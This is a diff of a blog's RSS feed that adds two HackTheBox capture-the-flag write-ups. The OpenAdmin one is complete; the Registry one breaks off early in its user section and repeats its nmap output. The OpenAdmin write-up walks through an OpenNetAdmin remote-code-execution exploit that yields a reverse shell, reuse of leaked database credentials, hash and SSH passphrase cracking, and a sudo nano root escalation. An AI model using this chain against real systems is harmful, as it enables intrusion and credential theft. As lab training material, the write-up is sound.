@@ -14,8 +14,155 @@
       
       <guid>https://5ysk3y.github.io/htb/guides/openadmin/</guid>
       <description>Overview OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
- NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:
-# Nmap 7.80 scan initiated Sat Jan 4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.</description>
+ NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/openadmin.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s begin by seeing what ports are currently open:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
+Nmap scan report for 10.10.10.171
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
+OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
+OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
+OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
+OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
+OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
+OS:0%CD=S)
+
+Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT      ADDRESS
+1   42.44 ms 10.10.14.
+2   42.49 ms 10.10.10.171
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;In a nutshell, we can see two open ports. Since SSH is up to date and we can&amp;rsquo;t directly compromise it, let&amp;rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/index.html (Status: 200)
+/music (Status: 301)
+/artwork (Status: 301)
+/sierra (Status: 301)
+/server-status (Status: 403)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/music&lt;/code&gt; and &lt;code&gt;/sierra&lt;/code&gt; seem to be independant sites, neither with anything too interesting present. That said, one of them (/music) had a link to login that points here:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And this is vulnerable to a certain exploit:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;OpenNetAdmin 18.1.1 - Remote Code Execution&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/bin/bash ./47691.sh 10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Once on the box I had a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file and found the following 2 users with shell access, aside from root:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Jimmy&lt;/li&gt;
+&lt;li&gt;Joanna&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I then ran linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;database_settings.inc.php&lt;/code&gt; :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$ona_contexts=array (
+  &#39;DEFAULT&#39; =&amp;gt;
+  array (
+    &#39;databases&#39; =&amp;gt;
+    array (
+      0 =&amp;gt;
+      array (
+        &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;,
+        &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;,
+        &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;,
+        &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,
+        &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;,
+        &#39;db_debug&#39; =&amp;gt; false,
+      ),
+    ),
+    &#39;description&#39; =&amp;gt; &#39;Default data context&#39;,
+    &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;,
+  ),
+);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this pass with one of the 2 available users; we get access as &lt;em&gt;Jimmy&lt;/em&gt;. I also tried as the Joanna user but that failed. So we have one login:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;jimmy:n1nj4W4rri0R&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Theres a folder named &lt;code&gt;internal&lt;/code&gt; within &lt;code&gt;/var/www&lt;/code&gt; and its owned by Jimmy - only he and the &lt;code&gt;internal&lt;/code&gt; group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;php -S [ip:port]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Viewing this you can see that it&amp;rsquo;s a login page that takes you to a page containing a &lt;code&gt;shell_exec&lt;/code&gt; statement. The code itself thankfully contians the password to get past the login form: &lt;code&gt;Revealed&lt;/code&gt; - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
+jimmy:Revealed
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&amp;rsquo;t initially see how I&amp;rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&amp;rsquo;s id_rsa file, so it&amp;rsquo;s like a double taunt.&lt;/p&gt;
+&lt;p&gt;Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;jimmy@openadmin:/home$ cat /etc/group | grep -i internal
+internal:x:1002:jimmy,joanna
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at listening ports on the machine we can also see something else interesting:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;jimmy@openadmin:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 ::1:52846               :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Login to the box via the usual means.&lt;/li&gt;
+&lt;li&gt;On a brand new line press: &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;~&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; to drop into an interactive SSH prompt.&lt;/li&gt;
+&lt;li&gt;Forward in the following manner:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;-L 9001:127.0.0.1:52846&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Alternatively, if I&amp;rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - &lt;code&gt;-f&lt;/code&gt; backgrounds the request so you don&amp;rsquo;t see any output and &lt;code&gt;-N&lt;/code&gt; tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.&lt;/p&gt;
+&lt;p&gt;Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the &lt;code&gt;internal&lt;/code&gt; directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.&lt;/p&gt;
+&lt;p&gt;Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: &lt;code&gt;bloodninjas&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Got in as Joanna. Got the user flag. Boom.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Root was unbelievably easy compared to the user steps.&lt;/p&gt;
+&lt;p&gt;I ran linPeas but it wasn&amp;rsquo;t really necessary; doing standard enum is enough. So I ran:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And found out Joanna had sudo access to the following command without a password:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo /bin/nano /opt/priv&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;It was purely a case of running that exact command along with &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
+ from GTFOBins:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+#
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Done! :)&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -25,6 +172,362 @@
       
       <guid>https://5ysk3y.github.io/htb/guides/registry/</guid>
       <description>Overview Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/registry.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Registry is an amazing Linux machine - it&amp;rsquo;s rated as hard but I didn&amp;rsquo;t find it all too difficult. That said it was very enjoyable and involves you, firstly, taking advantage of a Docker API to pull down an image from a Registry on the box. From there we get a shell and proceed to gain access to a hosted CMS called Bolt; this enables us to execute code as the www-data user which, conveniently, also has sudo access to a binary that can perform full system backups. Leveraging that, we&amp;rsquo;re able to backup the root folder giving us access to the final flag and some SSH keys for good measure.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;As standard we will begin with our nmap scan:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
+Nmap scan report for 10.10.10.159
+Host is up, received echo-reply ttl 63 (0.020s latency).
+Scanned at 2019-10-20 15:33:23 BST for 27s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
+|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
+80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Issuer: commonName=Registry
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-05-06T21:14:35
+| Not valid after:  2029-05-03T21:14:35
+| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
+| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
+| -----BEGIN CERTIFICATE-----
+| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
+| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
+| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
+| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
+| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
+| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
+| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
+| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
+| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
+| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
+| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
+| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
+| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
+| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
+| PEyspHOCbg1C6a0gI1xo0c0=
+|_-----END CERTIFICATE-----
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
+OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+1   27.26 ms 10.10.14.1
+2   27.27 ms 10.10.10.159
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
+skynet Boxes/ForwardSlash » cd ../Registry
+skynet Boxes/Registry » cat nmap/registry_initial.nmap
+# Nmap 7.80 scan initiated Sun Oct 20 15:33:23 2019 as: nmap -A -oA nmap/registry_initial -vvv 10.10.10.159
+Nmap scan report for 10.10.10.159
+Host is up, received echo-reply ttl 63 (0.020s latency).
+Scanned at 2019-10-20 15:33:23 BST for 27s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
+|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
+80/tcp  open  http     syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Issuer: commonName=Registry
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-05-06T21:14:35
+| Not valid after:  2029-05-03T21:14:35
+| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
+| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
+| -----BEGIN CERTIFICATE-----
+| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
+| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
+| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
+| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
+| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
+| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
+| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
+| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
+| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
+| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
+| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
+| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
+| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
+| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
+| PEyspHOCbg1C6a0gI1xo0c0=
+|_-----END CERTIFICATE-----
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=40128%PV=Y%DS=2%DC=T%G=Y%TM=5DAC70
+OS:4E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Uptime guess: 33.561 days (since Tue Sep 17 02:05:49 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT      ADDRESS
+1   27.26 ms 10.10.14.1
+2   27.27 ms 10.10.10.159
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 20 15:33:50 2019 -- 1 IP address (1 host up) scanned in 27.77 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;There&amp;rsquo;s not much exposed here, namely the web ports - 80/443 are open. Both, by default, load a standard nginx 1.14.0 page. Trusty Ubuntu, I think. There appear to be no differences in version so its not, say, 2 separate instances running on a single machine. Before we start poking around I&amp;rsquo;ll set off a gobuster directory scan - that said, manual poking didn&amp;rsquo;t seem to give me much (i.e. robots.txt etc). Thankfully gobuster came back with some results for us to check out:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Boxes/Registry » cat dirb/registry_initial
+/index.html (Status: 200)
+/install (Status: 301)
+/backup.php (Status: 200)
+/bolt (Status: 301)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Backup.php loads into a blank page, with no underlying source exposed, so we won&amp;rsquo;t be able to do much with that unless we find a way to read it.&lt;/p&gt;
+&lt;p&gt;Loading the &lt;code&gt;/bolt&lt;/code&gt; URI presents us with a templated webpage - I use the Wappalyzer extension in Firefox and that identifies this as Bolt CMS. After locating this on &lt;a href=&#34;https://github.com/bolt/bolt&#34; target=&#34;_blank&#34;&gt;Github&lt;/a&gt;
+ I found there was a changelog.md file - loading that via the box shows that this is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Bolt 3.6.4&lt;/p&gt;
+&lt;/blockquote&gt;
